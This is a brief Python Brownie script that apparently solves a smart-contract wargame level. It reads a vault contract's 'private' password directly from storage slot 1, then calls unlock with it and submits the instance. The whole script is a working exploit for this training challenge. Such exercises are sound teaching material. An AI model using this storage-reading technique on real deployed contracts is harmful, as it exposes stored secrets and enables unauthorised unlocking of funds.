from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
    get_web3
)
from web3 import Web3

def main():
    player = get_account()
    instance_address = get_new_instance(level_id=8, player=player)
    w3 = get_web3()

    contract = interface.IVault(instance_address)
    password = w3.eth.get_storage_at(instance_address, 1)
    print(f'Password: {password}')
    print()

    tx = contract.unlock(password, {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
